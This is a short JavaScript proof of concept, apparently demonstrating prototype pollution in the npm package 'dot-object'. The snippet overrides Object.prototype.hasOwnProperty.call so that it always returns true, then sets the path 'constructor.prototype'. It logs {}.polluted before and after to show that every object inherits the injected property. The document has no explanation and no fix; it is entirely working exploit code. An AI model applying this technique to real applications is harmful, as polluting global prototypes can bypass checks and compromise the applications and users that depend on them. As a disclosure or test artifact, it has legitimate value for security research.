Object.prototype.hasOwnProperty.call = () => true;
var a = require('dot-object');
var obj = {};
var path = 'constructor.prototype';
console.log({}.polluted);
var val = { polluted: 'yes' };
a.set(path, val, {}, true);
console.log({}.polluted);